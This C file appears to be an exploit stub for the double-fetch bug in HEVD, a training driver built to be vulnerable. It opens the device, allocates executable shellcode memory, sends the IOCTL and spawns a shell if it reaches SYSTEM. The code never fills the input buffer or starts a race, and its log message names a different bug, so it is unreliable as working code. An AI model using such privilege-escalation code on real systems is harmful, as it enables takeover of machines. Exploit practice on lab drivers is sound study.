#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#include <PwnLib.h>
#include <hevd.h>



#define IOCTL_CODE IOCTL_HEVD_DOUBLE_FETCH

HANDLE hDevice = INVALID_HANDLE_VALUE;



BOOL HevdIoControl()
{
        ULONG_PTR pShellcode = 0, pKernelBase = 0;
        DWORD dwInBufferSize, dwOutBufferSize, dwBytesReturned;
        LPVOID lpInBuffer, lpOutBuffer;
        BOOL bResult;

        info("Getting handle for device '%s' with code %#x\n", DRIVER_PATH, IOCTL_CODE);

        hDevice = CreateFileA(DRIVER_PATH,
                        GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                        NULL);
        if (hDevice == INVALID_HANDLE_VALUE){
                perr("CreateFileA failed");
                return FALSE;
        }
        ok("Got device handle %#x\n", hDevice);


        info("Preparing payload\n");
        pShellcode = AllocatePageWithShellcode();
        if (!pShellcode){
                perr("AllocatePageWithShellcode() failed");
                goto CloseDevice_loc;
        }
        ok("Got shellcode at %p\n", pShellcode);

        /*
        info("Retrieving kernel base...\n");
        pKernelBase = GetKernelImageBase();
        if (!pKernelBase){
                err("Failed to get Kernel image base\n");
                return FALSE;
        }
        */


        dwInBufferSize= dwOutBufferSize = GetPageSize();

        lpInBuffer = VirtualAlloc(NULL, dwInBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        lpOutBuffer = VirtualAlloc(NULL, dwOutBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


        bResult = DeviceIoControl(hDevice,
                                  IOCTL_CODE,
                                  lpInBuffer,
                                  dwInBufferSize,
                                  lpOutBuffer,
                                  dwOutBufferSize,
                                  &dwBytesReturned,
                                  (LPOVERLAPPED) NULL);
        if (bResult==FALSE){
                perr("DeviceIoControl() failed");
        }

        VirtualFree(lpInBuffer, dwInBufferSize, MEM_DECOMMIT);
        VirtualFree(lpOutBuffer, dwOutBufferSize, MEM_DECOMMIT);


CloseDevice_loc:

        if (pShellcode){
                info("Freeing shellcode page\n");
                VirtualFree((LPVOID)pShellcode, GetPageSize(), MEM_DECOMMIT);
        }

        if (hDevice != INVALID_HANDLE_VALUE){
                info("Closing device %p\n", hDevice);
                CloseHandle(hDevice);
        }



        return TRUE;
}



int main(int argc, char** argv, char** envp)
{
        UNREFERENCED_PARAMETER(argc);
        UNREFERENCED_PARAMETER(envp);


        info("Starting exploit for ArbitraryOverwrite...\n");

        if (HevdIoControl()==TRUE){
                info("Checking if %s is SYSTEM\n", argv[0]);
                if (CheckIsSystem()==TRUE){
                        ok("Success\n");
                        PopupCmd();
                } else {
                        warn("Not SYSTEM\n");
                }
        }

        return 0;
}
